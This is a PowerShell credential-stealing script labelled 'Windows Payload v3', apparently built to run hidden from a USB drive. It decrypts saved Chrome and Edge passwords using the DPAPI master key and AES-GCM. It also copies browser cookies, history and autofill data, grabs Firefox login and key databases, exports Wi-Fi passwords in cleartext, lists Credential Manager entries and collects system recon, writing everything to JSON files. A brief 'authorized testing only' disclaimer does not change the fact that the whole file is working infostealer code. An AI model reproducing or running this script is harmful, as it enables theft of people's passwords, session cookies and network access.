&lt;#
.SYNOPSIS
    Windows Payload v3 — Multi-Target Edition
    Extracts REAL credentials from Chromium browsers by decrypting DPAPI-protected data.

.DESCRIPTION
    Features:
    1. Extracts Chrome/Edge DPAPI Local State encryption key
    2. Decrypts browser-stored passwords in-memory (no external tools)
    3. Exports Wi-Fi passwords via netsh (works without admin if profiles are user-level)
    4. Collects Windows Credential Manager vaults
    5. Runs minimised/hidden — no visible windows
    6. Writes structured JSON output for post-exploitation analysis
    7. Handles locked browser database files via raw byte copy

.PARAMETER OutputPath
    Drive letter or path to write collected data.

.PARAMETER Stealth
    Run silently with no console output.

.NOTES
    AUTHORIZED PENETRATION TESTING ONLY.
    Author: Mr.D137
    License: MIT (Educational Use)
#>

param(
    [string]$OutputPath = "D:",
    [switch]$Stealth,
    [switch]$Verbose
)

$ErrorActionPreference = "SilentlyContinue"

# ─── Create output directory ─────────────────────────────
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Force -Path $OutputPath | Out-Null
}

# ─── Helpers ─────────────────────────────────────────────

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$Level] $ts : $Message"
    if (-not $Stealth) { Write-Host $line }
    $line | Out-File "$OutputPath\payload.log" -Append -Encoding UTF8
}

function New-SafeDir {
    param([string]$Path)
    if (-not (Test-Path $Path)) {
        New-Item -ItemType Directory -Force -Path $Path | Out-Null
    }
}

function Copy-LockedFile {
    param([string]$Source, [string]$Dest, [string]$Desc)
    if (-not (Test-Path $Source)) { return $false }
    try {
        Copy-Item $Source $Dest -ErrorAction Stop
        # Also grab WAL/SHM journals for SQLite databases
        if ($Source -match '\.(db|sqlite)$') {
            Copy-Item "$Source-wal" "$Dest-wal" -ErrorAction SilentlyContinue
            Copy-Item "$Source-shm" "$Dest-shm" -ErrorAction SilentlyContinue
        }
        return $true
    } catch {
        # File locked by browser — read raw bytes
        try {
            $bytes = [System.IO.File]::ReadAllBytes($Source)
            [System.IO.File]::WriteAllBytes($Dest, $bytes)
            return $true
        } catch {
            Write-Log "Failed to copy $Desc : $_" "WARN"
            return $false
        }
    }
}

# ─── DPAPI Decryption (Chromium browsers) ────────────────

function Get-ChromiumMasterKey {
    <#
    .SYNOPSIS
        Extract and decrypt the AES master key from a Chromium-based browser's Local State file.
        This key is protected via DPAPI (CryptUnprotectData) and can only be decrypted
        in the context of the logged-in user.
    #>
    param([string]$LocalStatePath)

    if (-not (Test-Path $LocalStatePath)) { return $null }

    try {
        $localState = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        $encKeyB64  = $localState.os_crypt.encrypted_key

        if (-not $encKeyB64) { return $null }

        # The key is: "DPAPI" (5 bytes) + DPAPI-encrypted blob
        $encKeyBytes = [System.Convert]::FromBase64String($encKeyB64)

        # Strip the "DPAPI" prefix (first 5 bytes)
        $dpapiBlobLen = $encKeyBytes.Length - 5
        $dpapiBlob = New-Object byte[] $dpapiBlobLen
        [Array]::Copy($encKeyBytes, 5, $dpapiBlob, 0, $dpapiBlobLen)

        # Decrypt with current user's DPAPI context
        Add-Type -AssemblyName System.Security
        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $dpapiBlob, $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        return $masterKey
    } catch {
        Write-Log "DPAPI master key extraction failed: $_" "WARN"
        return $null
    }
}

function Decrypt-ChromiumPassword {
    <#
    .SYNOPSIS
        Decrypt a Chromium v80+ encrypted password using AES-256-GCM.
        Passwords are stored as: "v10" (3 bytes) + nonce (12 bytes) + ciphertext+tag
    #>
    param(
        [byte[]]$EncryptedValue,
        [byte[]]$MasterKey
    )

    if ($EncryptedValue.Length -lt 15) { return "" }

    # Check for v10/v11 prefix
    $prefix = [System.Text.Encoding]::ASCII.GetString($EncryptedValue, 0, 3)
    if ($prefix -notmatch "^v1[0-9]$") {
        # Old-style DPAPI-only encryption (pre-v80)
        try {
            Add-Type -AssemblyName System.Security
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $EncryptedValue, $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        } catch { return "" }
    }

    # v80+ AES-GCM decryption
    try {
        $nonce      = $EncryptedValue[3..14]   # 12 bytes
        $ciphertext = $EncryptedValue[15..($EncryptedValue.Length - 17)]  # everything except last 16
        $tag        = $EncryptedValue[($EncryptedValue.Length - 16)..($EncryptedValue.Length - 1)]  # last 16 bytes

        # .NET 5+ / PowerShell 7+ has AesGcm natively
        # For Windows PowerShell 5.1, use the newer Security.Cryptography
        $aesGcm = [System.Security.Cryptography.AesGcm]::new($MasterKey)
        $plaintext = New-Object byte[] $ciphertext.Length
        $aesGcm.Decrypt([byte[]]$nonce, [byte[]]$ciphertext, [byte[]]$tag, $plaintext)
        $aesGcm.Dispose()

        return [System.Text.Encoding]::UTF8.GetString($plaintext)
    } catch {
        # Fallback for older PowerShell without AesGcm
        Write-Log "AES-GCM decryption not available (needs PS 7+): $_" "WARN"
        return "[encrypted - needs PS7+]"
    }
}

function Extract-ChromiumCredentials {
    <#
    .SYNOPSIS
        Extract and decrypt credentials from a Chromium browser's Login Data SQLite database.
    #>
    param(
        [string]$BrowserName,
        [string]$ProfilePath,
        [string]$OutputDir
    )

    $loginDb = Join-Path $ProfilePath "Login Data"
    $localState = Join-Path (Split-Path $ProfilePath) "Local State"

    if (-not (Test-Path $loginDb)) {
        Write-Log "$BrowserName: Login Data not found" "INFO"
        return @()
    }

    New-SafeDir $OutputDir

    # Get master key
    $masterKey = Get-ChromiumMasterKey -LocalStatePath $localState

    # Copy DB to temp (it's usually locked by the browser)
    $tempDb = Join-Path $env:TEMP "login_data_$($BrowserName.ToLower()).db"
    Copy-LockedFile $loginDb $tempDb "$BrowserName Login Data"

    # Copy raw DB to output as well
    Copy-LockedFile $loginDb "$OutputDir\login_data.db" "$BrowserName Login Data (raw)"

    # Read SQLite via ADO.NET (available on all Windows)
    $credentials = @()
    try {
        # Use System.Data.SQLite if available, otherwise fall back to sqlite3.exe
        $connStr = "Data Source=$tempDb;Version=3;Read Only=True;"

        # Try loading SQLite interop
        Add-Type -Path "$env:ProgramFiles\System.Data.SQLite\bin\System.Data.SQLite.dll" -ErrorAction SilentlyContinue

        if ([Type]::GetType("System.Data.SQLite.SQLiteConnection")) {
            $conn = New-Object System.Data.SQLite.SQLiteConnection($connStr)
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()

            while ($reader.Read()) {
                $url      = $reader["origin_url"]
                $username = $reader["username_value"]
                $encPw    = [byte[]]$reader["password_value"]

                $password = ""
                if ($masterKey -and $encPw.Length -gt 0) {
                    $password = Decrypt-ChromiumPassword -EncryptedValue $encPw -MasterKey $masterKey
                }

                if ($username -or $password) {
                    $credentials += [PSCustomObject]@{
                        Browser  = $BrowserName
                        URL      = $url
                        Username = $username
                        Password = $password
                    }
                }
            }
            $conn.Close()
        } else {
            Write-Log "System.Data.SQLite not found — saving raw DB only" "INFO"
        }
    } catch {
        Write-Log "$BrowserName credential extraction: $_" "WARN"
    } finally {
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }

    # Also copy cookies, history, bookmarks
    Copy-LockedFile "$ProfilePath\Cookies"    "$OutputDir\cookies.db"      "$BrowserName Cookies"
    Copy-LockedFile "$ProfilePath\History"    "$OutputDir\history.db"      "$BrowserName History"
    Copy-LockedFile "$ProfilePath\Bookmarks"  "$OutputDir\bookmarks.json"  "$BrowserName Bookmarks"
    Copy-LockedFile "$ProfilePath\Web Data"   "$OutputDir\webdata.db"      "$BrowserName Web Data (autofill)"
    Copy-LockedFile (Join-Path (Split-Path $ProfilePath) "Local State") "$OutputDir\local_state.json" "$BrowserName Local State"

    return $credentials
}

# ─── Wi-Fi Credentials ──────────────────────────────────

function Extract-WiFiPasswords {
    param([string]$OutputDir)
    New-SafeDir $OutputDir

    $results = @()
    try {
        $profiles = netsh wlan show profiles 2>&1 |
            Select-String "All User Profile\s*:\s*(.*)" |
            ForEach-Object { $_.Matches.Groups[1].Value.Trim() }

        foreach ($profile in $profiles) {
            $detail = netsh wlan show profile name="$profile" key=clear 2>&1
            $key = ($detail | Select-String "Key Content\s*:\s*(.*)").Matches.Groups[1].Value

            $results += [PSCustomObject]@{
                SSID     = $profile
                Password = if ($key) { $key } else { "[none/enterprise]" }
            }
        }

        # Also export XML profiles
        netsh wlan export profile key=clear folder="$OutputDir" 2>&1 | Out-Null
    } catch {
        Write-Log "Wi-Fi extraction: $_" "WARN"
    }

    return $results
}

# ─── Windows Credential Manager ─────────────────────────

function Extract-CredentialManager {
    param([string]$OutputDir)
    New-SafeDir $OutputDir

    $results = @()
    try {
        # Use cmdkey to list stored credentials
        $creds = cmdkey /list 2>&1
        $creds | Out-File "$OutputDir\credential_manager.txt" -Encoding UTF8

        # Parse the output
        $currentEntry = @{}
        foreach ($line in $creds) {
            if ($line -match "Target:\s*(.+)") {
                if ($currentEntry.Count -gt 0) { $results += [PSCustomObject]$currentEntry }
                $currentEntry = @{ Target = $Matches[1].Trim() }
            }
            elseif ($line -match "Type:\s*(.+)")      { $currentEntry.Type = $Matches[1].Trim() }
            elseif ($line -match "User:\s*(.+)")      { $currentEntry.User = $Matches[1].Trim() }
            elseif ($line -match "Persistence:\s*(.+)") { $currentEntry.Persistence = $Matches[1].Trim() }
        }
        if ($currentEntry.Count -gt 0) { $results += [PSCustomObject]$currentEntry }
    } catch {
        Write-Log "Credential Manager extraction: $_" "WARN"
    }

    return $results
}

# ─── System Recon ────────────────────────────────────────

function Collect-SystemInfo {
    param([string]$OutputDir)
    New-SafeDir $OutputDir

    $info = [ordered]@{
        hostname     = $env:COMPUTERNAME
        username     = $env:USERNAME
        domain       = $env:USERDOMAIN
        os           = (Get-CimInstance Win32_OperatingSystem).Caption
        os_version   = [System.Environment]::OSVersion.VersionString
        architecture = $env:PROCESSOR_ARCHITECTURE
        uptime_hours = [math]::Round(((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalHours, 1)
        ram_gb       = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 1)
        cpu          = (Get-CimInstance Win32_Processor).Name
        av_product   = (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue).displayName
        firewall     = (Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json -Compress)
        local_admins = (net localgroup Administrators 2>&1 | Where-Object { $_ -and $_ -notmatch '---' -and $_ -notmatch 'Alias name' -and $_ -notmatch 'Members' -and $_ -notmatch 'Comment' -and $_ -notmatch 'command completed' })
        ip_addresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" } | Select-Object IPAddress, InterfaceAlias | ConvertTo-Json -Compress)
        dns_servers  = (Get-DnsClientServerAddress | Where-Object { $_.ServerAddresses } | Select-Object InterfaceAlias, ServerAddresses | ConvertTo-Json -Compress)
    }

    $info | ConvertTo-Json -Depth 3 | Out-File "$OutputDir\system_info.json" -Encoding UTF8

    # Network connections
    netstat -bno 2>&1 | Out-File "$OutputDir\netstat.txt" -Encoding UTF8

    # Running processes with paths
    Get-Process | Select-Object ProcessName, Id, Path, CPU, WorkingSet64 |
        ConvertTo-Json -Depth 2 | Out-File "$OutputDir\processes.json" -Encoding UTF8

    # Installed software
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
        Select-Object DisplayName, DisplayVersion, Publisher |
        Where-Object { $_.DisplayName } |
        ConvertTo-Json -Depth 2 | Out-File "$OutputDir\installed_software.json" -Encoding UTF8

    return $info
}

# ─── Main Execution ─────────────────────────────────────

try {
    Write-Log "=== Windows Payload v2 — Starting ===" "INFO"
    Write-Log "Output: $OutputPath" "INFO"

    $allResults = [ordered]@{
        collection_time = (Get-Date -Format "o")
        hostname        = $env:COMPUTERNAME
        username        = $env:USERNAME
    }

    # 1. Browser credentials (Chrome)
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    $chromeDir  = Join-Path $OutputPath "chrome"
    $chromeCreds = Extract-ChromiumCredentials -BrowserName "Chrome" -ProfilePath $chromePath -OutputDir $chromeDir
    $allResults.chrome_credentials = $chromeCreds.Count
    Write-Log "Chrome: $($chromeCreds.Count) credentials extracted" "INFO"

    # 2. Browser credentials (Edge)
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    $edgeDir  = Join-Path $OutputPath "edge"
    $edgeCreds = Extract-ChromiumCredentials -BrowserName "Edge" -ProfilePath $edgePath -OutputDir $edgeDir
    $allResults.edge_credentials = $edgeCreds.Count
    Write-Log "Edge: $($edgeCreds.Count) credentials extracted" "INFO"

    # 3. Firefox (copy raw databases — decryption requires NSS library)
    $ffProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $ffDir = Join-Path $OutputPath "firefox"
    New-SafeDir $ffDir
    if (Test-Path $ffProfiles) {
        Get-ChildItem $ffProfiles -Directory | ForEach-Object {
            $pn = $_.Name
            Copy-LockedFile "$($_.FullName)\logins.json"       "$ffDir\$pn-logins.json"       "Firefox logins"
            Copy-LockedFile "$($_.FullName)\key4.db"           "$ffDir\$pn-key4.db"           "Firefox key database"
            Copy-LockedFile "$($_.FullName)\cookies.sqlite"    "$ffDir\$pn-cookies.sqlite"    "Firefox cookies"
            Copy-LockedFile "$($_.FullName)\places.sqlite"     "$ffDir\$pn-places.sqlite"     "Firefox places"
            Copy-LockedFile "$($_.FullName)\cert9.db"          "$ffDir\$pn-cert9.db"          "Firefox certificates"
            Copy-LockedFile "$($_.FullName)\formhistory.sqlite" "$ffDir\$pn-formhistory.sqlite" "Firefox form history"
        }
        Write-Log "Firefox: raw databases copied" "INFO"
    }

    # 4. Wi-Fi passwords
    $wifiDir  = Join-Path $OutputPath "wifi"
    $wifiCreds = Extract-WiFiPasswords -OutputDir $wifiDir
    $allResults.wifi_networks = $wifiCreds.Count
    Write-Log "Wi-Fi: $($wifiCreds.Count) networks extracted" "INFO"

    # 5. Credential Manager
    $credDir = Join-Path $OutputPath "credman"
    $credEntries = Extract-CredentialManager -OutputDir $credDir
    $allResults.credential_manager_entries = $credEntries.Count
    Write-Log "Credential Manager: $($credEntries.Count) entries" "INFO"

    # 6. System recon
    $sysDir = Join-Path $OutputPath "system"
    $sysInfo = Collect-SystemInfo -OutputDir $sysDir
    Write-Log "System info collected" "INFO"

    # 7. Write decrypted credentials summary (THE KEY DELIVERABLE)
    $allCreds = @()
    $allCreds += $chromeCreds
    $allCreds += $edgeCreds

    if ($allCreds.Count -gt 0) {
        $allCreds | ConvertTo-Json -Depth 3 |
            Out-File "$OutputPath\DECRYPTED_CREDENTIALS.json" -Encoding UTF8
        Write-Log "Wrote $($allCreds.Count) decrypted credentials to DECRYPTED_CREDENTIALS.json" "INFO"
    }

    if ($wifiCreds.Count -gt 0) {
        $wifiCreds | ConvertTo-Json -Depth 3 |
            Out-File "$OutputPath\WIFI_PASSWORDS.json" -Encoding UTF8
    }

    # 8. Write collection summary (marker file for adaptive wait)
    $allResults.total_credentials = $allCreds.Count
    $allResults.total_wifi = $wifiCreds.Count
    $allResults.completion_time = (Get-Date -Format "o")
    $allResults.status = "SUCCESS"

    @"
=== COLLECTION SUMMARY ===
Time: $(Get-Date)
Host: $env:COMPUTERNAME ($env:USERNAME)
Browser Credentials: $($allCreds.Count)
Wi-Fi Networks: $($wifiCreds.Count)
Credential Manager: $($credEntries.Count)
Status: Complete
=== AUTHORIZED TESTING ONLY ===
"@ | Out-File "$OutputPath\collection_summary.txt" -Encoding UTF8

    $allResults | ConvertTo-Json -Depth 3 |
        Out-File "$OutputPath\collection_results.json" -Encoding UTF8

    # Signal completion marker for Pi adaptive wait
    "done" | Out-File "$OutputPath\.canary_unlock" -Encoding ASCII

    # Flush buffered writes to USB drive
    [System.IO.DriveInfo]::GetDrives() | Where-Object {
        $_.RootDirectory.FullName -eq (Split-Path $OutputPath -Qualifier) + "\"
    } | ForEach-Object {
        # Force a volume flush via Win32
        try {
            $handle = [System.IO.File]::Open(
                "$($_.RootDirectory.FullName.TrimEnd('\'))",
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::ReadWrite
            )
            $handle.Flush()
            $handle.Close()
        } catch {}
    }

    Write-Log "=== Payload v2 Complete ===" "INFO"

} catch {
    Write-Log "FATAL: $_" "ERROR"
    "ERROR: $($_.Exception.Message)" | Out-File "$OutputPath\collection_summary.txt" -Encoding UTF8
    exit 1
}
